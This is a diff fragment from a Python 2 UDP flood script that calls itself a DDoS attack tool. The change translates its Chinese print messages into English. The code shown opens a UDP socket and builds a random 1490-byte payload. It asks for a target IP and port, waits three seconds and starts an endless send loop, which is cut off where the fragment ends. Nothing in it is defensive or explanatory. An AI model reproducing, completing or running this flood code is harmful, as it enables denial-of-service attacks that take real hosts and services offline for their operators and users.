@@ -17,11 +17,11 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-print "DDOS攻击脚本"
+print "DDOS-attack"
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
-print "3秒后开始攻击"
+print "ddos-attack start after 3 second"
 time.sleep(3)
 sent = 0
 while True:
